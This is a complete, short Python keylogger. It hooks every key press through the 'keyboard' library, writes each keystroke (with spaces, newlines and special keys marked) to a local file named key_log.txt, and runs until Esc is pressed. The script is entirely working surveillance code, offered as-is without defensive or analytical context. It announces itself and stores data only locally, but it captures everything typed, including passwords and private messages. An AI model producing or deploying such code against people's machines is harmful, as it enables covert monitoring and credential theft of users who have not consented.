import keyboard

# Specify the log file
log_file = "key_log.txt"

def on_key_event(event):
    with open(log_file, "a") as f:
        if event.name == 'space':
            f.write(' ')
        elif event.name == 'enter':
            f.write('\n')
        elif len(event.name) > 1:
            f.write(f' <{event.name}> ')
        else:
            f.write(event.name)

# Set up the keylogger
keyboard.on_press(on_key_event)

print("Keylogger is running... Press 'Esc' to stop.")

# Keep the program running until 'Esc' is pressed
keyboard.wait('esc')
